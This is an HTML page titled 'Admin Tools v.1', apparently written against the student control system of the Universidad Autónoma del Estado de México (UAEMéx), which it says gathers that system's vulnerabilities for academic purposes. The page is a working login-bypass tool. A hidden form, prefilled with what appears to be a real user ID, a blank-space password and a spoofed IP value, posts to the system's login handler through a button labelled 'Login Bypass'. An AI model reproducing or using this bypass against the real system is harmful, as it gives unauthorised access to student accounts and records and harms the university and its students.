<html>
  <head>
    <link rel="stylesheet" type="text/css" href="../../../../css/camila_I.css" />
    <link rel="stylesheet" type="text/css" href="../../../../sicde/css/sicde_I.css" />
    <link rel="stylesheet" type="text/css" href="../../../../sicde/css/sicde_I.css" />

    <style>
      @import url("../../../../css/styles.css");
    </style>
  </head>

  <body topmargin="0" leftmargin="0" marginheight="0" marginwidth="0">
    <script>
      function forgetPassword() {
        document.form1.action = "enviaContrasenia.jsp";
        document.form1.submit();
      }

      function firmarse() {
        var pass = document.form1.password.value;
        var usuario = document.form1.usuario.value;

        document.form1.submit();
      }
    </script>

    <table cellpadding="0" cellspacing="0" border="0" width="100%">
      <tr>
        <td align="center">
          <table cellpadding="0" border="0" align="center" cellspacing="0">
            <form name="form1" method="post" action="../txs/processLogin.jsp">
              <tr>
                <td class="" align="center"></td>
              </tr>
              <tr>
                <td class="camila_table_text">&nbsp;</td>
              </tr>
              <tr>
                <h1 class="sicde_label_title_body_1" align="center" style="font-size: 1.5rem">Admin Tools v.1</h1>
                <h1 class="sicde_label_title_body_1" align="center" style="font-size: 1rem">By: remk0r3</h1>
              </tr>
              <tr>
                <td class="camila_table_text">&nbsp;</td>
              </tr>
              <tr>
                <td>
                  <table cellpadding="4" border="0" align="center" cellspacing="1" bgcolor="#999999" style="display: none">
                    <tr class="camila_table_row_title">
                      <td class="camila_form_title_label"><br /></td>
                      <td class="camila_form_title_text"></td>
                    </tr>

                    <tr>
                      <td height="25" class="camila_form_label">Usuario*</td>
                      <td class="camila_form_text">
                        <input name="usuario" type="text" size="60" class="camila_form_inputText" maxlength="255" value="1929076" />
                        <input type="hidden" name="ipUsuario" value="0.0.0.0" />
                      </td>
                    </tr>

                    <tr>
                      <td height="25" class="camila_form_label">Password*</td>
                      <td class="camila_form_text">
                        <input name="password" type="password" size="60" class="camila_form_inputText" maxlength="255" value=" " />
                      </td>
                    </tr>
                  </table>
                </td>
              </tr>
              <tr>
                <td height="25" bgcolor="white">
                  <table border="0" width="100%" height="100%">
                    <tr width="100%" height="100%">
                      <td align="left"></td>
                      <td align="right">
                        <!-- 
							<input name="submit1" type="submit" value="Firmarse"
								class="camila_form_button" maxlength="255">							
							 -->
                        <input id="btnFirmarse" name="btnFirmarse" type="button" value="Login Bypass" class="camila_form_button" onclick="firmarse()" style="font-size: 2rem; height: 50px; width: 400px; border-radius: 1em; cursor: pointer; background-color: var(--doradoIntenso)" />
                      </td>
                    </tr>
                  </table>
                </td>
              </tr>
            </form>
            <table cellpadding='0' cellspacing='0' border='0' width='80%' align='center'>
              <br>
              <br>
              <br>
              <tr>
                <td width='10%' align='center'>
                  <img width='150' height='150' src='https://www.icegif.com/wp-content/uploads/2023/05/icegif-555.gif'>
                </td>
              </tr>
              </table>
              <br><br><br><br>
              <h5 class="sicde_label_title_body_1" align="center">Admin Tools es una versión del Sistema de Control Escolar de la UAEMéx</h5>
              <h5 class="sicde_label_title_body_1" align="center">que recopila las vulnerabilidades del sistema, desarrollado con fines académicos.</h5><br>
              <h5 class="sicde_label_title_body_1" align="center">Puede consultar el repositorio de este proyecto a continuación.</h5>
              <img src="../../../../assets/github.png" alt="Repositorio de GitHub" style="height: 35px; margin-top: 10px; cursor: pointer;" onclick="window.open('https://github.com', '_blank');">
          </table>
        </td>
      </tr>
    </table>

    

    <br /><br />
    <div style="padding-left: 20%; padding-right: 20%">
      <!-- 
		<span style="color:AF2A0E; font-size:20px;"><CENTER> <B>AVISO</B> </CENTER>
		Si te interesa realizar un cambio de plantel, registra tu solicitud en este portal en el apartado cambios de plantel, del 24 de junio al 05 de julio de 2022 (No aplica para alumnos de nuevo ingreso).</span><br><br>
	 -->
    </div>
  </body>
</html>
